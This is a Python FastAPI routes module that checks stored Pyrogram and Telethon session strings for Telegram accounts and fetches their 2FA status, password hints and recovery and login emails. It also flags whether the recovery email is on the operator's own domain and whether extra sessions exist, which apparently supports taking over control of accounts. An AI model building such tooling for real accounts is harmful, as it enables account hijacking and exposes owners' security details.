"""
Session Management API Routes
Handles: session health check, session info, emails (dynamic fetch)
Distinguishes between:
- Login Email: Email used to login (alternative to phone)
- Recovery Email: Email used to reset 2FA password
"""

import time
from datetime import datetime
from typing import Dict, Any
from fastapi import APIRouter, HTTPException

from backend.core_engine.logger import get_logger
from backend.core_engine.pyrogram_client import get_session_manager
from backend.core_engine.telethon_client import get_telethon_manager
from backend.models.database import get_account, update_account

logger = get_logger("SessionsAPI")
router = APIRouter(tags=["Sessions"])

from config import API_ID, API_HASH, EMAIL_DOMAIN
OUR_DOMAIN = EMAIL_DOMAIN


def get_pyrogram():
    return get_session_manager(API_ID, API_HASH, "sessions")


def get_telethon():
    return get_telethon_manager(API_ID, API_HASH)


async def check_pyrogram_health(phone: str) -> Dict[str, Any]:
    """Check Pyrogram session with real connection"""
    manager = get_pyrogram()
    
    try:
        me_info = await manager.get_me_info(phone)
        if me_info.get("status") == "success":
            return {"active": True, "user_id": me_info.get("id"), "type": "pyrogram"}
    except:
        pass
    
    account = await get_account(phone)
    if account and account.pyrogram_session:
        try:
            connected = await manager.connect_from_string(phone, account.pyrogram_session)
            if connected:
                me_info = await manager.get_me_info(phone)
                if me_info.get("status") == "success":
                    return {"active": True, "user_id": me_info.get("id"), "reconnected": True, "type": "pyrogram"}
        except:
            pass
    
    return {"active": False, "type": "pyrogram", "error": "Session dead"}


async def check_telethon_health(phone: str) -> Dict[str, Any]:
    """Check Telethon session with real connection"""
    manager = get_telethon()
    
    try:
        client = manager.active_clients.get(phone)
        if client and await client.is_user_authorized():
            me = await client.get_me()
            return {"active": True, "user_id": me.id, "type": "telethon"}
    except:
        pass
    
    account = await get_account(phone)
    if account and account.telethon_session:
        try:
            connected = await manager.connect_from_string(phone, account.telethon_session)
            if connected:
                client = manager.active_clients.get(phone)
                if client:
                    me = await client.get_me()
                    return {"active": True, "user_id": me.id, "reconnected": True, "type": "telethon"}
        except:
            pass
    
    return {"active": False, "type": "telethon", "error": "Session dead"}


async def get_account_emails_live(phone: str, known_password: str = None) -> Dict[str, Any]:
    """
    Get BOTH login email AND recovery email from Telegram (dynamic fetch):
    - login_email_pattern: Email used to login (alternative to phone) - SEPARATE feature!
    - recovery_email_full: Full 2FA recovery email (only with known_password)
    - email_unconfirmed_pattern: Pending recovery email change
    - has_recovery_email: Recovery email confirmed (pattern hidden by Telegram)
    """
    manager = get_pyrogram()
    
    try:
        security = await manager.get_security_info(phone, known_password=known_password)
        
        if security.get("status") != "success":
            return {"status": "error", "error": "Failed to get security info"}
        
        recovery_email_full = security.get("recovery_email_full")
        email_unconfirmed = security.get("email_unconfirmed_pattern")
        has_recovery = security.get("has_recovery_email", False)
        
        # Determine recovery email status
        recovery_status = "none"
        is_our_recovery = False
        if recovery_email_full:
            recovery_status = "confirmed"
            is_our_recovery = OUR_DOMAIN in recovery_email_full.lower()
        elif email_unconfirmed:
            recovery_status = "pending"
            is_our_recovery = OUR_DOMAIN in str(email_unconfirmed).lower()
        elif has_recovery:
            recovery_status = "confirmed_unknown"
        
        result = {
            "status": "success",
            "has_2fa": security.get("has_password", False),
            "recovery_email_full": recovery_email_full,
            "recovery_email_status": recovery_status,
            "is_our_recovery_email": is_our_recovery,
            "email_unconfirmed_pattern": email_unconfirmed,
            "has_recovery_email": has_recovery,
            "login_email_pattern": security.get("login_email_pattern"),
            "login_email_status": "confirmed" if security.get("login_email_pattern") else "none",
            "password_hint": security.get("password_hint"),
            "sessions_count": security.get("other_sessions_count", 0) + 1
        }
        
        return result
        
    except Exception as e:
        logger.error(f"Error fetching emails for {phone}: {e}")
        return {"status": "error", "error": str(e)}


@router.get("/sessions/health/{account_id}")
async def get_session_health(account_id: str):
    """Check BOTH Pyrogram and Telethon sessions with real connection"""
    phone = account_id
    
    account = await get_account(phone)
    if not account:
        raise HTTPException(status_code=404, detail="Account not found")
    
    pyrogram = await check_pyrogram_health(phone)
    telethon = await check_telethon_health(phone)
    
    await update_account(
        phone,
        pyrogram_healthy=pyrogram["active"],
        telethon_healthy=telethon["active"],
        last_session_check=datetime.utcnow()
    )
    
    return {
        "status": "success",
        "account_id": phone,
        "pyrogram": pyrogram,
        "telethon": telethon,
        "both_active": pyrogram["active"] and telethon["active"]
    }


@router.get("/sessions/emails/{account_id}")
async def get_account_emails(account_id: str):
    """
    Get ALL emails from Telegram (dynamic - NOT stored):
    - login_email: Used for login instead of phone
    - recovery_email: Used to reset 2FA password
    - pending_email: Waiting confirmation
    """
    phone = account_id
    
    account = await get_account(phone)
    if not account:
        raise HTTPException(status_code=404, detail="Account not found")
    
    emails = await get_account_emails_live(phone)
    
    if emails.get("status") != "success":
        raise HTTPException(status_code=400, detail=emails.get("error"))
    
    return {
        "status": "success",
        "account_id": phone,
        "telegram_id": account.telegram_id,
        "recovery_email": emails.get("recovery_email_full"),
        "recovery_email_status": emails.get("recovery_email_status", "none"),
        "is_our_recovery_email": emails.get("is_our_recovery_email", False),
        "email_unconfirmed_pattern": emails.get("email_unconfirmed_pattern"),
        "has_recovery_email": emails.get("has_recovery_email"),
        "login_email_pattern": emails.get("login_email_pattern"),
        "login_email_status": emails.get("login_email_status"),
        "target_email": account.target_email,
        "has_2fa": emails.get("has_2fa"),
        "sessions_count": emails.get("sessions_count")
    }


@router.get("/sessions/info/{account_id}")
async def get_session_info(account_id: str):
    """Get comprehensive session info with both sessions and emails"""
    phone = account_id
    
    account = await get_account(phone)
    if not account:
        raise HTTPException(status_code=404, detail="Account not found")
    
    pyrogram = await check_pyrogram_health(phone)
    telethon = await check_telethon_health(phone)
    emails = await get_account_emails_live(phone)
    
    mode = account.transfer_mode.value if account.transfer_mode else "bot_only"
    expected_sessions = 1 if mode == "bot_only" else 2
    
    return {
        "status": "success",
        "account_id": phone,
        "telegram_id": account.telegram_id,
        "transfer_mode": mode,
        "sessions": {
            "pyrogram": pyrogram,
            "telethon": telethon,
            "both_active": pyrogram["active"] and telethon["active"],
            "total_count": emails.get("sessions_count", 0),
            "expected": expected_sessions,
            "has_extra": emails.get("sessions_count", 0) > expected_sessions
        },
        "emails": {
            "recovery_email": emails.get("recovery_email_full"),
            "recovery_email_status": emails.get("recovery_email_status", "none"),
            "is_our_recovery_email": emails.get("is_our_recovery_email", False),
            "email_unconfirmed_pattern": emails.get("email_unconfirmed_pattern"),
            "has_recovery_email": emails.get("has_recovery_email"),
            "login_email_pattern": emails.get("login_email_pattern"),
            "login_email_status": emails.get("login_email_status"),
            "target_email": account.target_email
        },
        "security": {
            "has_2fa": emails.get("has_2fa", False),
            "password_hint": emails.get("password_hint")
        }
    }
